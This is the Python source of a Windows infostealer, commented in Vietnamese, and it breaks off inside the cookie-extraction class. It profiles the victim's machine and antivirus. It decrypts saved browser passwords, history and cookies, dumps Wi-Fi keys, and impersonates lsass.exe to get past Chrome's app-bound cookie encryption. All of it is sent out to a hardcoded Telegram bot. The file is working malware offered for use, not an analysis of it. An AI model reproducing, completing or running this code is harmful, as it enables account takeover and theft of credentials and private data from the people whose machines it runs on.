
import os
import sqlite3
import json
import base64
import shutil
import requests
from Crypto.Cipher import AES
import win32crypt
import zipfile
import io
import time
import psutil
import hmac

bot_token = '8581243471:AAG6aJyB-pcDBJwNPfgUXMnhBDlJREpJmts' 
chat_id = '-1003628689556'

import subprocess
from screeninfo import get_monitors
import pycountry


import sys
import struct
import ctypes
import pathlib
import binascii
import glob
from contextlib import contextmanager

try:
    import windows
    import windows.security
    import windows.crypto
    import windows.generated_def as gdef
except ImportError:
    print("❌ Thiếu thư viện 'windows'")
    print("📦 Đang cài đặt...")
    os.system("pip install git+https://github.com/ReWolf/python-windows.git")
    import windows
    import windows.security
    import windows.crypto
    import windows.generated_def as gdef

from Crypto.Cipher import AES, ChaCha20_Poly1305
import requests


class PcInfo:
    def __init__(self):
        self.get_system_info()

    def get_country_code(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return str(country.alpha_2).lower()
        except LookupError:
            return "unknown"

    def get_all_avs(self) -> str:
        try:
            process = subprocess.run(
                "Get-WmiObject -Namespace 'Root\\SecurityCenter2' -Class AntivirusProduct | Select-Object displayName",
                shell=True, capture_output=True, text=True
            )
            if process.returncode == 0:
                output = process.stdout.strip().splitlines()
                if len(output) >= 2:
                    av_list = [av.strip() for av in output[1:] if av.strip()]
                    return ", ".join(av_list)
            return "No antivirus found"
        except Exception as e:
            print(f"Error getting antivirus: {e}")
            return "Error retrieving antivirus information"

    def get_screen_resolution(self):
        try:
            monitors = get_monitors()
            resolutions = [f"{monitor.width}x{monitor.height}" for monitor in monitors]
            return ', '.join(resolutions) if resolutions else "Unknown"
        except Exception as e:
            print(f"Error getting screen resolution: {e}")
            return "Unknown"

    def get_system_info(self):
        try:
            computer_os = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_OperatingSystem).Caption"', capture_output=True, shell=True, text=True)
            computer_os = computer_os.stdout.strip() if computer_os.returncode == 0 else "Unknown"
            cpu = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_Processor).Name"', capture_output=True, shell=True, text=True)
            cpu = cpu.stdout.strip() if cpu.returncode == 0 else "Unknown"
            gpu = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_VideoController).Name"', capture_output=True, shell=True, text=True)
            gpu = gpu.stdout.strip() if gpu.returncode == 0 else "Unknown"
            ram = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory"', capture_output=True, shell=True, text=True)
            ram = str(round(int(ram.stdout.strip()) / (1024 ** 3))) if ram.returncode == 0 else "Unknown"
            model = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).Model"', capture_output=True, shell=True, text=True)
            model = model.stdout.strip() if model.returncode == 0 else "Unknown"
            username = os.getenv("UserName")
            hostname = os.getenv("COMPUTERNAME")
            uuid = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystemProduct).UUID"', capture_output=True, shell=True, text=True)
            uuid = uuid.stdout.strip() if uuid.returncode == 0 else "Unknown"
            product_key = subprocess.run('powershell -Command "(Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey"', capture_output=True, shell=True, text=True)
            product_key = product_key.stdout.strip() if product_key.returncode == 0 and product_key.stdout.strip() != "" else "Failed to get product key"
            r = requests.get("http://ip-api.com/json/?fields=225545").json()
            country = r.get("country", "Unknown")
            proxy = r.get("proxy", False)
            ip = r.get("query", "Unknown")
            _, addrs = next(iter(psutil.net_if_addrs().items()))
            mac = addrs[0].address
            screen_resolution = self.get_screen_resolution()

            message = f'''
**PC Username:** `{username}`
**PC Name:** `{hostname}`
**Model:** `{model if model else "Unknown"}`
**Screen Resolution:** `{screen_resolution}`
**OS:** `{computer_os}`
**Product Key:** `{product_key}`
**MAC:** `{mac}`
**UUID:** `{uuid}`\n
**CPU:** `{cpu}`
**GPU:** `{gpu}`
**RAM:** `{ram}GB`\n
**Antivirus:** `{self.get_all_avs()}`'''

            tasklist = subprocess.run("tasklist", capture_output=True, shell=True, text=True)
            tasklist_output = tasklist.stdout.strip()

            installed_apps = subprocess.run("wmic product get name", capture_output=True, shell=True, text=True)
            installed_apps_output = installed_apps.stdout.strip()

            log_file = "tasklist.txt"
            with open(log_file, 'w', encoding='utf-8') as f: 
                f.write("Danh sách ứng dụng đang chạy:\n")
                f.write(tasklist_output)
                f.write("\n\nDanh sách phần mềm đã cài đặt:\n")
                f.write(installed_apps_output)
            self.send_message_to_telegram(message)
            self.send_file_to_telegram(log_file)
            os.remove(log_file)
            print(f"Tệp {log_file} đã được xóa.")

        except Exception as e:
            self.send_message_to_telegram(f"Error occurred: {str(e)}")
            print(f"Error occurred: {str(e)}")

    def send_message_to_telegram(self, message: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        retries = 3  
        for attempt in range(retries):
            try:
                response = requests.post(
                    url,
                    data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
                )
                if response.status_code == 200:
                    print("Gửi thông điệp thành công")
                    return response
                else:
                    print(f"Không thể gửi thông điệp. Mã trạng thái: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Lần thử {attempt + 1} thất bại: {e}")
                if attempt < retries - 1:
                    time.sleep(5)  
                else:
                    print("Đã thử tối đa. Không thể gửi thông điệp.")
        return None

    def send_file_to_telegram(self, file_path: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        retries = 3  
        for attempt in range(retries):
            try:
                with open(file_path, 'rb') as file:
                    response = requests.post(
                        url,
                        files={'document': file},
                        data={'chat_id': chat_id}
                    )
                if response.status_code == 200:
                    print("Gửi tệp thành công")
                    return response
                else:
                    print(f"Không thể gửi tệp. Mã trạng thái: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Lần thử {attempt + 1} thất bại: {e}")
                if attempt < retries - 1:
                    time.sleep(5)  
                else:
                    print("Đã thử tối đa. Không thể gửi tệp.")
        return None


class Browser:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        self.create_zip_file()
        self.send_file_to_telegram("password_full.zip")
        os.remove("password_full.zip")
    
    def get_encryption_key(self, browser_path):
        local_state_path = os.path.join(browser_path, 'Local State')
        if not os.path.exists(local_state_path):
            return None

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state_data = json.load(f)

        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  

        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key

    def decrypt_password(self, encrypted_password, key):
        try:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(payload)[:-16].decode()
            return decrypted_password
        except Exception as e:
            return None

    def extract_passwords(self, zip_file):
        for browser, browser_path in self.browser.items():
            if not os.path.exists(browser_path):
                continue

            for profile in self.profiles:
                login_db_path = os.path.join(browser_path, profile, 'Login Data')
                if not os.path.exists(login_db_path):
                    continue

                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_LoginData.db")
                shutil.copyfile(login_db_path, tmp_db_path)

                conn = sqlite3.connect(tmp_db_path)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    key = self.get_encryption_key(browser_path)
                    if not key:
                        continue

                    password_data = io.StringIO()
                    password_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    password_data.write("=" * 120 + "\n")
                    password_data.write(f"{'Website':<60} | {'Username':<30} | {'Password':<30}\n")
                    password_data.write("=" * 120 + "\n")

                    for row in cursor.fetchall():
                        origin_url = row[0]
                        username = row[1]
                        encrypted_password = row[2]
                        decrypted_password = self.decrypt_password(encrypted_password, key)
                        password_data.write(f"{origin_url} | {username} | {encrypted_password}\n")
                        if username and decrypted_password:
                            password_data.write(f"{origin_url:<60} | {username:<30} | {decrypted_password:<30}\n")

                    password_data.write("\n")  
                    
                    zip_file.writestr(f"browser/{browser}_passwords_{profile}.txt", password_data.getvalue())

                except Exception as e:
                    print(f"Error extracting from {browser}: {e}")

                cursor.close()
                conn.close()
                os.remove(tmp_db_path)

    def extract_history(self, zip_file):
        for browser, browser_path in self.browser.items():
            if not os.path.exists(browser_path):
                continue

            for profile in self.profiles:
                history_db_path = os.path.join(browser_path, profile, 'History')
                if not os.path.exists(history_db_path):
                    continue

                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_History.db")
                try:
                    shutil.copyfile(history_db_path, tmp_db_path)
                except PermissionError:
                    print(f"Không thể sao chép tệp {history_db_path}. Có thể tệp đang được sử dụng.")
                    continue  
                conn = sqlite3.connect(tmp_db_path)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")

                    history_data = io.StringIO()
                    history_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    history_data.write("=" * 120 + "\n")
                    history_data.write(f"{'URL':<80} | {'Title':<30} | {'Visit Count':<10} | {'Last Visit Time'}\n")
                    history_data.write("=" * 120 + "\n")

                    for row in cursor.fetchall():
                        url = row[0]
                        title = row[1]
                        visit_count = row[2]
                        last_visit_time = row[3]

                        history_data.write(f"{url:<80} | {title:<30} | {visit_count:<10} | {last_visit_time}\n")

                    history_data.write("\n") 
                    
                    zip_file.writestr(f"browser/{browser}_history_{profile}.txt", history_data.getvalue())

                except Exception as e:
                    print(f"Error extracting history from {browser}: {e}")

                cursor.close()
                conn.close()
                os.remove(tmp_db_path)

    def create_zip_file(self):
        with zipfile.ZipFile("password_full.zip", "w") as zip_file:
            self.extract_passwords(zip_file)
            self.extract_history(zip_file)

    def send_file_to_telegram(self, file_path: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        retries = 3  
        for attempt in range(retries):
            try:
                with open(file_path, 'rb') as file:
                    response = requests.post(
                        url,
                        files={'document': file},
                        data={'chat_id': chat_id}
                    )
                if response.status_code == 200:
                    print("Gửi tệp thành công")
                    return response
                else:
                    print(f"Không thể gửi tệp. Mã trạng thái: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Lần thử {attempt + 1} thất bại: {e}")
                if attempt < retries - 1:
                    time.sleep(5)  
                else:
                    print("Đã thử tối đa. Không thể gửi tệp.")
        return None

import requests
import subprocess
import re
import time

class Wifi:
    def __init__(self):
        self.networks = {}
        self.get_networks()
        self.send_info_to_telegram()

    def run_command(self, command, encoding='utf-8'):
        try:
            result = subprocess.run(command, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return result.stdout.strip()
        except subprocess.CalledProcessError as e:
            print(f"Error executing command {command}: {e}")
            return f"Error: {e}"

    def get_networks(self):
        output_networks = self.run_command(["netsh", "wlan", "show", "profiles"])
        if "Error" in output_networks:
            print("Error in getting Wi-Fi profiles:", output_networks)
            return  
        
        profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profile" in line]
        if not profiles:
            print("No Wi-Fi profiles found.")
        
        for profile in profiles:
            if profile:
                profile_info = self.run_command(["netsh", "wlan", "show", "profile", profile, "key=clear"])
                self.networks[profile] = self.extract_password(profile_info)

    def extract_password(self, profile_info):
        match = re.search(r"Key Content\s*:\s*(.+)", profile_info)
        return match.group(1).strip() if match else "No password found"

    def get_router_ip(self):
        output = self.run_command("ipconfig")
        if "Error" in output:
            print("Error in getting router IP:", output)
            return "Failed to get router IP"
        
        router_ip = None
        is_eth = False  
        for line in output.splitlines():
            if "Ethernet adapter" in line:  
                is_eth = True
            elif is_eth and "Default Gateway" in line:
                router_ip = line.split(":")[1].strip()
                break
        
        if not router_ip:
            print("Failed to get router IP from LAN.")
        return router_ip if router_ip else "Failed to get router IP"

    def get_mac_address(self):
        router_ip = self.get_router_ip()
        if router_ip == "Failed to get router IP":
            return "Failed to get MAC address"
        
        self.run_command(f"ping -n 1 {router_ip}")  
        output = self.run_command(f"arp -a {router_ip}")
        if "Error" in output:
            print("Error in getting MAC address:", output)
            return "MAC address not found"
        
        mac_address_match = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", output)
        return mac_address_match.group() if mac_address_match else "MAC address not found"

    def get_vendor_info(self, mac_address):
        try:
            url = f"https://api.macvendors.com/{mac_address}"
            response = requests.get(url)
            if response.status_code == 200:
                return response.text
            else:
                print(f"Failed to get vendor info. Status code: {response.status_code}")
                return "Vendor info not found"
        except requests.RequestException as e:
            print(f"Error in getting vendor info: {e}")
            return f"Error: {e}"

    def send_info_to_telegram(self):
        router_ip = self.get_router_ip()
        mac_address = self.get_mac_address()
        vendor_info = self.get_vendor_info(mac_address)
        
        message = f'''
**Router IP Address:** `{router_ip}`
**Router MAC Address:** `{mac_address}`
**Router Vendor:** `{vendor_info}`
**Saved Wi-Fi Networks:**
'''
        if self.networks:
            for network, password in self.networks.items():
                message += f"- `{network}`: `{password}`\n"
        else:
            message += "No Wi-Fi networks found."
        
        self.send_message_to_telegram(message)

    def send_message_to_telegram(self, message: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        retries = 3  
        for attempt in range(retries):
            try:
                response = requests.post(
                    url,
                    data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
                )
                if response.status_code == 200:
                    print("Message sent successfully")
                    return response
                else:
                    print(f"Failed to send message. Status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Attempt {attempt + 1} failed: {e}")
                if attempt < retries - 1:
                    time.sleep(5)  
                else:
                    print("Maximum retries reached. Could not send message.")
        return None

class Cookie:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.user_profile = os.environ['USERPROFILE']
        
        self.browsers = {
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]
        
        self.temp_path = os.path.join(os.path.expanduser("~"), "tmp")
        os.makedirs(os.path.join(self.temp_path, "Cookies"), exist_ok=True)
        
        self.master_keys = {}
        self.all_cookies = []
        
        print("="*60)
        print("COOKIE EXTRACTOR - TẤT CẢ BROWSER")
        print("="*60)
        
        if not self.is_admin():
            print("❌ Script cần chạy với quyền Administrator!")
            print("Vui lòng chạy lại với quyền admin.")
            input("Nhấn Enter để thoát...")
            sys.exit(1)
        
        print("✅ Đang chạy với quyền Administrator")
        print("\n🔍 Đang tìm cookies từ tất cả browser...")
        
        self.extract_all_cookies()
        self.create_zip_and_send()
        
    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    @contextmanager
    def impersonate_lsass(self):
        """impersonate lsass.exe to get SYSTEM privilege"""
        original_token = windows.current_thread.token
        try:
            windows.current_process.token.enable_privilege("SeDebugPrivilege")
            proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
            lsass_token = proc.token
            impersonation_token = lsass_token.duplicate(
                type=gdef.TokenImpersonation,
                impersonation_level=gdef.SecurityImpersonation
            )
            windows.current_thread.token = impersonation_token
            yield
        except Exception as e:
            print(f"⚠️  Lỗi impersonate: {e}")
            yield
        finally:
            windows.current_thread.token = original_token
    
    def get_master_key(self, browser_path):
        """Lấy master key từ Local State"""
        local_state_path = os.path.join(browser_path, 'Local State')
        if not os.path.exists(local_state_path):
            return None
            
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            # Thử lấy app_bound_encrypted_key trước (v20)
            if "app_bound_encrypted_key" in local_state["os_crypt"]:
                return self.get_v20_master_key(local_state, browser_path)
            
            # Fallback to encrypted_key (v10/v11)
            if "encrypted_key" in local_state["os_crypt"]:
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
                master_key = self.decrypt_with_dpapi(encrypted_key)
                return master_key
                
            return None
            
        except Exception as e:
            print(f"  ❌ Lỗi lấy master key: {e}")
            return None
    
    def get_v20_master_key(self, local_state, browser_path):
        """Lấy master key cho v20 (App-Bound Encryption)"""
        try:
            app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
            decoded = binascii.a2b_base64(app_bound_encrypted_key)
            
            if decoded[:4] != b"APPB":
                return None
                
            key_blob_encrypted = decoded[4:]
            
            with self.impersonate_lsass():
                key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
            
            key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
            parsed_data = self.parse_key_blob(key_blob_user_decrypted)
            
            if parsed_data['flag'] == 18:
                # Flag 18 sử dụng HMAC key derivation
                return self.derive_v20_master_key_flag18(parsed_data, browser_path)
            else:
                v20_master_key = self.derive_v20_master_key(parsed_data)
                return v20_master_key
            
        except Exception as e:
            print(f"  ❌ Lỗi lấy v20 master key: {e}")
            return None
    
    def decrypt_with_dpapi(self, encrypted_data):
        """Giải mã với DPAPI"""
        try:
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
        except:
            return windows.crypto.dpapi.unprotect(encrypted_data)
    
    def parse_key_blob(self, blob_data: bytes) -> dict:
        """Parse key blob"""
        buffer = io.BytesIO(blob_data)
        parsed_data = {}

        try:
            header_len = struct.unpack('<I', buffer.read(4))[0]
            parsed_data['header'] = buffer.read(header_len)
            content_len = struct.unpack('<I', buffer.read(4))[0]
            
            print(f"  📊 Header length: {header_len}, Content length: {content_len}")
            
            parsed_data['flag'] = buffer.read(1)[0]
            print(f"  🏷️  Flag: {parsed_data['flag']}")
            
            # Hỗ trợ flag 18 (HMAC key derivation)
            if parsed_data['flag'] == 18:
                # Flag 18: [flag|iv|ciphertext|tag|hmac]
                parsed_data['iv'] = buffer.read(12)
                parsed_data['ciphertext'] = buffer.read(32)
                parsed_data['tag'] = buffer.read(16)
                parsed_data['hmac'] = buffer.read(32)  # HMAC-SHA256
                print(f"  ✅ Parsed flag 18: iv=12 bytes, ciphertext=32 bytes, tag=16 bytes, hmac=32 bytes")
                
            elif parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
                parsed_data['iv'] = buffer.read(12)
                parsed_data['ciphertext'] = buffer.read(32)
                parsed_data['tag'] = buffer.read(16)
                
            elif parsed_data['flag'] == 3:
                parsed_data['encrypted_aes_key'] = buffer.read(32)
                parsed_data['iv'] = buffer.read(12)
                parsed_data['ciphertext'] = buffer.read(32)
                parsed_data['tag'] = buffer.read(16)
                
            elif parsed_data['flag'] == 4 or parsed_data['flag'] == 5:
                parsed_data['iv'] = buffer.read(12)
                parsed_data['ciphertext'] = buffer.read(32)
                parsed_data['tag'] = buffer.read(16)
                
            else:
                # Fallback
                print(f"  ⚠️  Unknown flag {parsed_data['flag']}, trying to parse...")
                try:
                    parsed_data['iv'] = buffer.read(12)
                    parsed_data['ciphertext'] = buffer.read(32)
                    parsed_data['tag'] = buffer.read(16)
                except:
                    raise ValueError(f"Cannot parse blob with flag {parsed_data['flag']}")

        except Exception as e:
            print(f"  ❌ Lỗi parse key blob: {e}")
            raise

        return parsed_data
    
    def decrypt_with_cng(self, input_data):
        """Decrypt với CNG"""
        ncrypt = ctypes.windll.NCRYPT
        hProvider = gdef.NCRYPT_PROV_HANDLE()
        provider_name = "Microsoft Software Key Storage Provider"
        status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
        if status != 0:
            raise Exception(f"NCryptOpenStorageProvider failed with status {status}")

        hKey = gdef.NCRYPT_KEY_HANDLE()
        key_name = "Google Chromekey1"
        status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
        if status != 0:
            ncrypt.NCryptFreeObject(hProvider)
            raise Exception(f"NCryptOpenKey failed with status {status}")

        pcbResult = gdef.DWORD(0)
        input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

        try:
            status = ncrypt.NCryptDecrypt(
                hKey,
                input_buffer,
                len(input_buffer),
                None,
                None,
                0,
                ctypes.byref(pcbResult),
                0x40
            )
            if status != 0:
                raise Exception(f"1st NCryptDecrypt failed with status {status}")

            buffer_size = pcbResult.value
            output_buffer = (ctypes.c_ubyte * pcbResult.value)()

            status = ncrypt.NCryptDecrypt(
                hKey,
                input_buffer,
                len(input_buffer),
                None,
                output_buffer,
                buffer_size,
                ctypes.byref(pcbResult),
                0x40
            )
            if status != 0:
                raise Exception(f"2nd NCryptDecrypt failed with status {status}")

            result = bytes(output_buffer[:pcbResult.value])
        finally:
            ncrypt.NCryptFreeObject(hKey)
            ncrypt.NCryptFreeObject(hProvider)

        return result
    
    def byte_xor(self, ba1, ba2):
        return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
    
    def derive_v20_master_key_flag18(self, parsed_data: dict, browser_path: str) -> bytes:
        """Derive master key cho flag 18 (HMAC key derivation)"""
        try:
            print(f"  🔑 Deriving master key for flag 18...")
            
            # Đọc key từ registry hoặc file
            # Key thường được lưu trong registry: HKEY_CURRENT_USER\Software\Google\Chrome\PreferenceMACs
            import winreg
            
            # Xác định registry path dựa trên browser
            if 'chrome' in browser_path.lower():
                reg_path = r"Software\Google\Chrome\PreferenceMACs"
            elif 'edge' in browser_path.lower():
                reg_path = r"Software\Microsoft\Edge\PreferenceMACs"
            elif 'brave' in browser_path.lower():
                reg_path = r"Software\BraveSoftware\Brave\PreferenceMACs"
            else:
                reg_path = r"Software\Google\Chrome\PreferenceMACs"
            
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path)
                hmac_key_bytes = winreg.QueryValueEx(key, "")[0]
                winreg.CloseKey(key)
                print(f"  ✅ Found HMAC key from registry")
            except:
                # Fallback: sử dụng key mặc định
                print(f"  ⚠️  Using default HMAC key")
                hmac_key_bytes = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
            
            # Tạo HMAC với key từ registry
            hmac_obj = hmac.new(hmac_key_bytes, parsed_data['ciphertext'], hashlib.sha256)
            expected_hmac = hmac_obj.digest()
            
            print(f"  🔑 HMAC verified: {expected_hmac == parsed_data['hmac']}")
            
            # Decrypt với AES-GCM
            cipher = AES.new(hmac_key_bytes, AES.MODE_GCM, nonce=parsed_data['iv'])
            master_key = cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
            
            print(f"  ✅ Master key derived successfully!")
            return master_key
            
        except Exception as e:
            print(f"  ❌ Lỗi derive master key flag 18: {e}")
            raise
    
    def derive_v20_master_key(self, parsed_data: dict) -> bytes:
        """Derive master key cho v20"""
        try:
            print(f"  🔑 Processing flag {parsed_data['flag']}...")
            
            if parsed_data['flag'] == 1:
                aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
                cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
            elif parsed_data['flag'] == 2:
                chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
                cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
            elif parsed_data['flag'] == 3:
                xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
                with self.impersonate_lsass():
                    decrypted_aes_key = self.decrypt_with_cng(parsed_data['encrypted_aes_key'])
                xored_aes_key = self.byte_xor(decrypted_aes_key, xor_key)
                cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
            elif parsed_data['flag'] == 4 or parsed_data['flag'] == 5:
                aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
                cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
            else:
                print(f"  ⚠️  Unknown flag {parsed_data['flag']}, using fallback...")
                aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
                cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])

            result = cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
            print(f"  ✅ Master key derived successfully!")
            return result
            
        except Exception as e:
            print(f"  ❌ Lỗi derive master key: {e}")
            raise
    
    def decrypt_cookie(self, encrypted_value, master_key):
        """Giải mã cookie"""
        try:
            if not encrypted_value or len(encrypted_value) < 15:
                return None
            
            # v20 cookies
            if encrypted_value[:3] == b"v20":
                return self.decrypt_cookie_v20(encrypted_value, master_key)
            
            # v10/v11 cookies
            if encrypted_value[:3] in [b"v10", b"v11"]:
                return self.decrypt_cookie_v10(encrypted_value, master_key)
                
            return None
            
        except Exception as e:
            return None
    
    def decrypt_cookie_v10(self, encrypted_value, master_key):
        """Giải mã cookie v10/v11"""
        try:
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            decrypted = cipher.decrypt_and_verify(payload, tag)
            return decrypted.decode('utf-8', errors='ignore')
        except:
            return None
    
    def decrypt_cookie_v20(self, encrypted_value, master_key):
        """Giải mã cookie v20"""
        try:
            cookie_iv = encrypted_value[3:3+12]
            encrypted_cookie = encrypted_value[3+12:-16]
            cookie_tag = encrypted_value[-16:]
            cookie_cipher = AES.new(master_key, AES.MODE_GCM, nonce=cookie_iv)
            decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
            return decrypted_cookie[32:].decode('utf-8', errors='ignore')
        except Exception as e:
            return None
    
    def get_browser_profiles(self, browser_path):
        """Lấy tất cả profile của browser"""
        if not os.path.exists(browser_path):
            return []
            
        profiles_found = []
        
        # Kiểm tra các profile
        for profile in self.profiles:
            profile_path = os.path.join(browser_path, profile)
            if os.path.exists(profile_path):
                profiles_found.append(profile)
        
        # Nếu không có profile nào, thêm Default
        if not profiles_found:
            default_path = os.path.join(browser_path, 'Default')
            if os.path.exists(default_path):
                profiles_found.append('Default')
        
        return profiles_found
    
    def extract_cookies_from_browser(self, browser_name, browser_path, master_key):
        """Trích xuất cookies từ một browser"""
        if not master_key:
            return
        
        profiles = self.get_browser_profiles(browser_path)
        if not profiles:
            return
        
        for profile in profiles:
            try:
                # Xác định đường dẫn cookies
                if browser_name in ['opera', 'opera-gx']:
                    cookie_db_path = os.path.join(browser_path, 'Network', 'Cookies')
                else:
                    cookie_db_path = os.path.join(browser_path, profile, 'Network', 'Cookies')
                
                if not os.path.exists(cookie_db_path):
                    continue
                
                # Copy file để tránh lock
                temp_db = os.path.join(os.environ['TEMP'], f'cookies_{browser_name}_{profile}.db')
                try:
                    shutil.copy2(cookie_db_path, temp_db)
                except:
                    temp_db = cookie_db_path
                
                # Đọc cookies
                conn = sqlite3.connect(temp_db)
                conn.text_factory = bytes
                cursor = conn.cursor()
                
                cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
                
                cookies_found = 0
                for row in cursor.fetchall():
                    host_key = row[0].decode('utf-8', errors='ignore') if isinstance(row[0], bytes) else row[0]
                    name = row[1].decode('utf-8', errors='ignore') if isinstance(row[1], bytes) else row[1]
                    path = row[2].decode('utf-8', errors='ignore') if isinstance(row[2], bytes) else row[2]
                    encrypted_value = row[3]
                    expires_utc = row[4]
                    
                    if encrypted_value:
                        decrypted = self.decrypt_cookie(encrypted_value, master_key)
                        if decrypted:
                            self.all_cookies.append({
                                'browser': browser_name,
                                'profile': profile,
                                'host': host_key,
                                'name': name,
                                'path': path,
                                'value': decrypted,
                                'expires': expires_utc
                            })
                            cookies_found += 1
                
                cursor.close()
                conn.close()
                
                if temp_db != cookie_db_path and os.path.exists(temp_db):
                    os.remove(temp_db)
                
                if cookies_found > 0:
                    print(f"  ✅ {browser_name} - {profile}: {cookies_found} cookies")
                    
            except Exception as e:
                print(f"  ❌ Lỗi {browser_name} - {profile}: {e}")
    
    def extract_all_cookies(self):
        """Trích xuất cookies từ tất cả browser"""
